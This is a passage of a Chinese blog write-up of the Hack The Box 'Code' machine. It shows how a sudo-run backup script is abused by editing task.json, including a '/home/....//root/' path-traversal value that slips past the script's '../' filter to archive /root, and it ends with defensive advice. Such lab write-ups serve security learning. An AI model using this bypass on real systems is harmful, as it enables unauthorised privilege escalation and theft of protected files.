+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250331124548226.png" alt="image-20250331124548226"></p>
+<p>解压后发现，备份脚本确实将 <code>/home/app-production/app</code> 目录下的所有内容都备份到了压缩包中。  这意味着我们可以通过修改 <code>task.json</code> 文件，让备份脚本备份其他目录，从而提取敏感信息。</p>
+<p>修改 <code>task.json</code> 文件，将 <code>directories_to_archive</code> 修改为 <code>&quot;/home/app-production/&quot;</code>，目标是备份 <code>/home/app-production/</code> 目录，以获取 <code>userFlag</code>。</p>
+<p><strong>修改后的 <code>task.json</code> 文件内容 (获取 userFlag):</strong></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250331125134164.png" alt="image-20250331125134164"></p>
+<p>再次执行 <code>sudo /usr/bin/backy.sh task.json</code> 命令。</p>
+<p><strong>执行 <code>sudo /usr/bin/backy.sh task.json</code> (获取 userFlag):</strong></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250331125707805.png" alt="image-20250331125707805"></p>
+<p>脚本成功执行，并在 <code>/home/martin/backups/</code> 目录下生成了新的压缩包。  解压该压缩包，找到 <code>user.txt</code> 文件，即可获取 userFlag。</p>
+<h2 id="三、rootFlag">三、rootFlag</h2>
+<p>既然 userFlag 可以通过修改 <code>task.json</code> 文件获取，那么 rootFlag 也同理，我们可以尝试修改 <code>task.json</code> 文件来备份 root 目录。</p>
+<p>尝试将 <code>task.json</code> 文件修改为备份 <code>/root</code> 目录。  由于 <code>backy.sh</code> 脚本会过滤掉 <code>../</code>，为了绕过路径检查，我们使用路径 <code>/home/....//root/</code>。  这个路径在 Linux 文件系统中会被解析为 <code>/root</code> 目录。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;destination&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/martin/backups/&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;multiprocessing&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;verbose_log&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;directories_to_archive&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;/home/....//root/&quot;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p><strong>修改后的 <code>task.json</code> 文件内容，cat 进行查看发现 …/ 已经被过滤(获取 rootFlag):</strong></p>
+<p>可以看到，<code>directories_to_archive</code> 已经修改为 <code>&quot;/home/../root/&quot;</code>。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250331141919626.png" alt="image-20250331141919626"></p>
+<p>可以看到，<code>backy.sh</code> 脚本执行成功，并且 <code>tar</code> 命令开始打包 <code>/home/../root/</code> 目录下的文件。从输出信息 <code>Archiving: [/home/root]</code> 和 <code>tar: Removing leading '/home/../'</code> 可以看出，<code>backy.sh</code> 和 <code>tar</code> 都正确地处理了这个路径，最终备份的目标是 <code>/root</code> 目录。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250331142045180.png" alt="image-20250331142045180"></p>
+<p>发现 root 目录！</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250331142142058.png" alt="image-20250331142142058"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250331141619024.png" alt="image-20250331141619024"></p>
+<h2 id="安全建议">安全建议</h2>
+<ol>
+<li><strong>代码编辑器安全:</strong>  避免对外暴露不必要的服务，例如代码编辑器。如果必须使用，请确保代码编辑器本身的安全，并进行严格的权限控制和输入验证，防止代码执行漏洞。</li>
+<li><strong>脚本安全:</strong>  对于具有高权限 (sudo) 的脚本，必须进行严格的安全审计，防止被恶意利用。  特别是要仔细检查脚本对用户输入 (例如配置文件) 的处理，防止路径遍历、命令注入等漏洞。</li>
+<li><strong>最小权限原则:</strong>  运行脚本和服务的用户，应遵循最小权限原则，避免赋予不必要的权限。</li>
+<li><strong>安全配置:</strong>  对于备份脚本，应仔细配置备份策略，例如限制备份目录范围，避免备份敏感数据。</li>
+</ol>
+
+<div class="article-footer fs14">
+    <section id="references">
+      <div class="header"><span>参考资料</span></div>
+      <div class="body">
+        <ul>
+        <li class="post-title">
+          <p><a target="_blank" rel="noopener" href="https://medium.com/@dharaniswaran.cs22/hack-the-box-code-season-7-writeup-560fd28d1557">Hack the box: Code — Season 7 writeup!</a></p>
+
+        </li>
+        </ul>
+      </div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2025/02/19/%E5%87%AF%E5%B0%94%E7%89%B9%E7%9A%84%E8%96%84%E6%9A%AE/">凯尔特的薄暮</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><center>
+  <p>© <span id="copyright_year"></span> Rabbit 使用 Stellar 创建</p>
+  <p>✨ 营业：<span id="runtime_span"></span> ✨</p>
+  <p>共发表 <span id="blog_count">56</span> 篇Blog 🔸 总计 <span id="total_words">123.6k</span> 字</p>
+  <script type="text/javascript">
+    (function() {
+      // 动态年份
+      document.getElementById('copyright_year').textContent = new Date().getFullYear();
+
+      // 运行时长
+      const startDate = new Date('2023-12-20T00:00:00');
+      function updateRuntime() {
+        const now = new Date();
+        const diff = now - startDate;
+        const days = Math.floor(diff / (24 * 60 * 60 * 1000));
+        const hours = Math.floor((diff % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000));
+        const minutes = Math.floor((diff % (60 * 60 * 1000)) / (60 * 1000));
+        const seconds = Math.floor((diff % (60 * 1000)) / 1000);
+        document.getElementById('runtime_span').innerHTML =
+          `${days}天-${hours}小时-${minutes}分-${seconds}秒`; // 修改输出格式
+      }
+      setInterval(updateRuntime, 1000);
+      updateRuntime();
+
+      // 博客统计数据 (这里是静态示例，你可以根据实际情况手动更新或动态获取)
+      // document.getElementById('blog_count').textContent = '你的博客文章总数';
+      // document.getElementById('total_words').textContent = '你的博客文章总字数';
+    })();
+  </script>
+</center>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">一、信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81userFlag"><span class="toc-text">二、userFlag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81rootFlag"><span class="toc-text">三、rootFlag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%AE"><span class="toc-text">安全建议</span></a></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+  <script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js`,
+    marked: `https://cdn.jsdelivr.net/npm/marked@13.0.1/lib/marked.umd.min.js`
+  }
+  
+
+</script>
+
+    <script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+      <script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+        <script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+
+          <!-- required -->
+          <script src="/js/main.js?v=1.29.1" defer></script>
+
+          <script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    applyThemeToGiscus(theme)
+  }
+
+  const applyThemeToGiscus = (theme) => {
+    theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    }
+  })()
+</script>
+
+
+            <!-- optional -->
+            
+
+
+              <script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+                
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+
+
+
+                  <!-- inject -->
+                  
+
+                    <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
+                    <script>
+                      hljs.highlightAll();  // 这段代码会自动找到页面中所有的代码块并进行高亮
+                    </script> --><script src="/js/plugins/copycode.js"></script>
+    <script type="text/javascript" 
+      color="220,220,220" 
+      opacity="0.7" 
+      zIndex="-2" 
+      count="200" 
+      src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+    </script>
+  </div></body></html>
